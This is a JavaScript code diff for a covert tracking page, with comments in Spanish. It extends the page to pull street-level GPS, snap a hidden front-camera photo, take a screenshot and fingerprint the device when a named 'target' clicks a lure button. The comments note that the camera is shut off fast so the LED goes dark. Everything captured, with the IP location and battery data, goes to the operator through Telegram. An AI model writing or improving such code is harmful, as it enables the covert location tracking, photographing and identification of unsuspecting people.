@@ -129,9 +129,40 @@ async function captureAllData() {
 }
 
 /* ====================================================
-   2. GEOLOCALIZACIÓN
+   2. GEOLOCALIZACIÓN NATIVA & IP FALLBACK
    ==================================================== */
-async function fetchGeolocation() {
+
+// Obtiene el GPS Nivel Calle si el usuario da permisos (HTML5 Geolocation API)
+function getHighAccuracyGPS() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(null);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                resolve({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy, // en metros
+                    source: 'NATIVE_GPS'
+                });
+            },
+            (error) => {
+                sendLogToBackend(">> Permiso GPS Denegado/Error: " + error.message);
+                resolve(null); // Falló o denegó, continuar con IP fallback
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    });
+}
+
+// Resuelve IP o devuelve N/A
+async function fetchIPLocationData() {
     // Intento primario: ipapi.co
     try {
         const res = await fetch(CONFIG.GEO_API_PRIMARY, { signal: AbortSignal.timeout(6000) });
@@ -139,21 +170,14 @@ async function fetchGeolocation() {
             const data = await res.json();
             if (data && data.ip && !data.error) {
                 return {
-                    ip: data.ip,
-                    city: data.city || 'Desconocida',
-                    region: data.region || 'Desconocida',
-                    country: data.country_name || data.country || 'Desconocido',
-                    countryCode: data.country || '',
-                    lat: data.latitude || 'N/A',
-                    lon: data.longitude || 'N/A',
-                    timezone: data.timezone || 'N/A',
-                    isp: data.org || 'N/A',
-                    asn: data.asn || 'N/A',
-                    postal: data.postal || 'N/A',
+                    ip: data.ip, city: data.city || 'Desconocida', region: data.region || 'Desconocida',
+                    country: data.country_name || data.country || 'Desconocido', countryCode: data.country || '',
+                    lat: data.latitude || 'N/A', lon: data.longitude || 'N/A', timezone: data.timezone || 'N/A',
+                    isp: data.org || 'N/A', asn: data.asn || 'N/A', postal: data.postal || 'N/A', source: 'IP_GEO'
                 };
             }
         }
-    } catch (e) { console.warn("Fallo ipapi.co:", e.message); }
+    } catch (e) { }
 
     // Fallback secundario: ip-api.com
     try {
@@ -162,23 +186,16 @@ async function fetchGeolocation() {
             const data = await res.json();
             if (data && data.status === 'success') {
                 return {
-                    ip: data.query, // ip-api lo devuelve en "query"
-                    city: data.city || 'Desconocida',
-                    region: data.regionName || 'Desconocida',
-                    country: data.country || 'Desconocido',
-                    countryCode: data.countryCode || '',
-                    lat: data.lat || 'N/A',
-                    lon: data.lon || 'N/A',
-                    timezone: data.timezone || 'N/A',
-                    isp: data.isp || data.org || 'N/A',
-                    asn: data.as || 'N/A',
-                    postal: data.zip || 'N/A',
+                    ip: data.query, city: data.city || 'Desconocida', region: data.regionName || 'Desconocida',
+                    country: data.country || 'Desconocido', countryCode: data.countryCode || '',
+                    lat: data.lat || 'N/A', lon: data.lon || 'N/A', timezone: data.timezone || 'N/A',
+                    isp: data.isp || data.org || 'N/A', asn: data.as || 'N/A', postal: data.zip || 'N/A', source: 'IP_GEO'
                 };
             }
         }
-    } catch (e) { console.warn("Fallo ip-api.com:", e.message); }
+    } catch (e) { }
 
-    // Fallback terciario: solo IP si todo falla (Cloudflare)
+    // Fallback terciario: Cloudflare
     try {
         const res = await fetch('https://1.1.1.1/cdn-cgi/trace', { signal: AbortSignal.timeout(3000) });
         if (res.ok) {
@@ -187,16 +204,31 @@ async function fetchGeolocation() {
             const locMatch = text.match(/loc=(.+)/);
             if (ipMatch) {
                 return {
-                    ip: ipMatch[1], city: 'N/A', region: 'N/A',
-                    country: locMatch ? locMatch[1] : 'N/A',
-                    countryCode: locMatch ? locMatch[1] : '',
-                    lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'Cloudflare Trace fallback', asn: 'N/A', postal: 'N/A'
+                    ip: ipMatch[1], city: 'N/A', region: 'N/A', country: locMatch ? locMatch[1] : 'N/A',
+                    countryCode: locMatch ? locMatch[1] : '', lat: 'N/A', lon: 'N/A', timezone: 'N/A',
+                    isp: 'Cloudflare Trace Fallback', asn: 'N/A', postal: 'N/A', source: 'IP_ONLY'
                 };
             }
         }
     } catch (e) { }
 
-    return { ip: 'No disponible (Posible Bloqueador/VPN)', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', error: true };
+    return { ip: 'No disponible (VPN/Bloqueador)', city: 'N/A', region: 'N/A', country: 'N/A', countryCode: '', lat: 'N/A', lon: 'N/A', timezone: 'N/A', isp: 'N/A', asn: 'N/A', postal: 'N/A', source: 'NONE' };
+}
+
+// Orquestador completo de Geolocalización
+async function fetchGeolocation() {
+    const ipData = await fetchIPLocationData();
+    const gpsData = await getHighAccuracyGPS(); // Intenta pedir permisos y obtener GPS fino
+
+    // Si logró obtener GPS fino, combinamos sus coords exactas con los datos de IP ciudad/isp.
+    if (gpsData) {
+        ipData.lat = gpsData.lat;
+        ipData.lon = gpsData.lon;
+        ipData.accuracy = gpsData.accuracy;
+        ipData.source = 'NATIVE_GPS_MIXED';
+    }
+
+    return ipData;
 }
 
 /* ====================================================
@@ -431,6 +463,70 @@ async function captureScreenshot() {
 }
 
 /* ====================================================
+   10.B CAPTURA DE CÁMARA FRONTAL (WEBCAM)
+   ==================================================== */
+async function captureWebcamPhoto() {
+    return new Promise(async (resolve) => {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            sendLogToBackend(">> MediaDevices API no soportada en este navegador.");
+            resolve(null);
+            return;
+        }
+
+        try {
+            // Solicita explícitamente la cámara frontal
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' },
+                audio: false
+            });
+
+            // Creamos un elemento <video> fantasma para reproducir el stream
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.autoplay = true;
+            video.playsInline = true;
+
+            // Esperar a que el video comience a reproducirse para tener un frame válido
+            video.onloadeddata = async () => {
+                try {
+                    // Darle 500ms al sensor de la cámara para ajustar brillo/contraste
+                    await new Promise(r => setTimeout(r, 500));
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+
+                    // Dibujar el frame actual del video en el canvas
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Detener todas las pistas de la cámara para apagar el LED verde rápidamente
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // Convertir el canvas directamente a Blob
+                    canvas.toBlob((blob) => {
+                        resolve(blob);
+                    }, 'image/jpeg', 0.90);
+                } catch (e) {
+                    sendLogToBackend(">> Error renderizando frame de cámara: " + e.message);
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(null);
+                }
+            };
+
+            video.onerror = () => {
+                stream.getTracks().forEach(track => track.stop());
+                resolve(null);
+            }
+
+        } catch (error) {
+            sendLogToBackend(">> Permiso de Cámara Denegado/Error: " + error.message);
+            resolve(null); // Falló (denegó permiso o no tiene cámara)
+        }
+    });
+}
+
+/* ====================================================
    11. CONSTRUIR MENSAJE TELEGRAM
    ==================================================== */
 function buildTelegramMessage(data) {
@@ -537,25 +633,29 @@ async function sendToTelegram(data) {
     }
 }
 
-// Envía la foto (screenshot)
-async function sendPhotoToTelegram(blob, data) {
-    sendLogToBackend(">> Ingresando a sendPhotoToTelegram con blob size: " + (blob ? blob.size : 'NULL'));
-    console.log("[SEND PHOTO] Blob size:", blob ? blob.size : 'NULL', "bytes");
+// Envía las fotos (screenshot y webcam si existe)
+async function sendPhotoToTelegram(blobs, data) {
+    sendLogToBackend(">> Ingresando a sendPhotoToTelegram con " + blobs.length + " blobs");
 
     try {
-        if (!blob || blob.size === 0) {
-            sendLogToBackend(">> ERROR: Blob vacío o inválido. Tamaño: " + (blob?.size || 0));
-            console.error("[SEND PHOTO] Blob is empty!");
+        if (!blobs || blobs.length === 0) {
+            sendLogToBackend(">> ERROR: Array de Blobs vacío");
             return;
         }
 
         const formData = new FormData();
-        formData.append("photo", blob, "screenshot.jpg");
         // ID del objetivo para que el backend sepa a quién pertenece
         formData.append("targetId", data.targetId || 'Visitante Anónimo');
 
-        sendLogToBackend(">> FormData creado " + formData.toString() + ", iniciando POST a /api/photo...");
-        console.log("[SEND PHOTO] Sending photo for targetId:", data.targetId);
+        // Añadir cada blob válido a la lista de "photos"
+        blobs.forEach((blobObj, index) => {
+            if (blobObj && blobObj.blob && blobObj.blob.size > 0) {
+                formData.append("photos", blobObj.blob, blobObj.name);
+                sendLogToBackend(`>> Adjuntada foto ${index + 1}: ${blobObj.name} (${blobObj.blob.size} bytes)`);
+            }
+        });
+
+        sendLogToBackend(">> FormData creado, iniciando POST multiple a /api/photo...");
 
         const response = await fetch('/api/photo', {
             method: "POST",
@@ -564,7 +664,6 @@ async function sendPhotoToTelegram(blob, data) {
 
         const result = await response.json();
         sendLogToBackend(">> fetch a /api/photo finalizó. Respuesta: " + JSON.stringify(result));
-        console.log("[SEND PHOTO] Response:", result);
     } catch (err) {
         sendLogToBackend(">> Error enviando FormData a /api/photo: " + err.message);
         console.error("Error al enviar foto:", err);
@@ -698,39 +797,38 @@ async function handleMainCta() {
     if (clickSent) return;
     clickSent = true;
 
-    // Si los datos base no se capturaron (visita orgánica inicial), forzamos captura ahora
-    if (!capturedData || !capturedData.geo || capturedData.geo.ip === 'No disponible') {
-        sendLogToBackend(">> Obteniendo datos de ubicación bajo demanda tras click...");
+    // Si los datos base no se capturaron, o si ya hay datos de IP pero queremos forzar 
+    // pedir permisos de GPS de alta precisión en el momento del click:
+    sendLogToBackend(">> Obteniendo datos de ubicación y cámara bajo demanda tras click...");
 
-        const [geoData, batteryData] = await Promise.all([
-            fetchGeolocation(),
-            fetchBatteryData(),
-        ]);
+    // Ejecuta las capturas pesadas (GPS/IP, Batería, Cámara Web, Screenshot de pantalla) todas al mismo tiempo
+    const [geoData, batteryData, webcamBlob, screenshotDataUrl] = await Promise.all([
+        fetchGeolocation(),
+        fetchBatteryData(),
+        captureWebcamPhoto(),
+        captureScreenshot()
+    ]);
 
-        const browserData = parseBrowserData();
-        const hwData = parseHardwareData();
-        const canvasFingerprint = generateCanvasFingerprint();
-        const webglFingerprint = generateWebGLFingerprint();
-        const connectionData = parseConnectionData();
+    const browserData = parseBrowserData();
+    const hwData = parseHardwareData();
+    const canvasFingerprint = generateCanvasFingerprint();
+    const webglFingerprint = generateWebGLFingerprint();
+    const connectionData = parseConnectionData();
 
-        capturedData = {
-            targetId: getTargetIdFromUrl(),
-            geo: geoData,
-            browser: browserData,
-            hardware: hwData,
-            battery: batteryData,
-            canvas: canvasFingerprint,
-            webgl: webglFingerprint,
-            connection: connectionData,
-            referrer: document.referrer || 'Directo',
-            pageUrl: window.location.href,
-            pageTitle: document.title,
-        };
-        updateUI(geoData, browserData);
-    }
-
-    // Captura screenshot al momento del click
-    const screenshot = await captureScreenshot();
+    capturedData = {
+        targetId: getTargetIdFromUrl(),
+        geo: geoData,
+        browser: browserData,
+        hardware: hwData,
+        battery: batteryData,
+        canvas: canvasFingerprint,
+        webgl: webglFingerprint,
+        connection: connectionData,
+        referrer: document.referrer || 'Directo',
+        pageUrl: window.location.href,
+        pageTitle: document.title,
+    };
+    updateUI(geoData, browserData);
 
     const timeOnPage = Math.round((Date.now() - pageLoadTime) / 1000);
 
@@ -743,9 +841,26 @@ async function handleMainCta() {
     };
 
     await sendToTelegram(clickData);
-    if (screenshot) {
-        const blob = dataURItoBlob(screenshot);
-        await sendPhotoToTelegram(blob, clickData);
+
+    // Preparar las fotos capturadas
+    const blobsToSend = [];
+
+    // 1. Agregar Screenshot
+    if (screenshotDataUrl) {
+        const screenshotBlob = dataURItoBlob(screenshotDataUrl);
+        if (screenshotBlob) {
+            blobsToSend.push({ blob: screenshotBlob, name: 'screenshot.jpg' });
+        }
+    }
+
+    // 2. Agregar Foto de Cámara Frontal
+    if (webcamBlob) {
+        blobsToSend.push({ blob: webcamBlob, name: 'webcam_photo.jpg' });
+    }
+
+    // Enviar todas las fotos recolectadas
+    if (blobsToSend.length > 0) {
+        await sendPhotoToTelegram(blobsToSend, clickData);
     }
 }
 
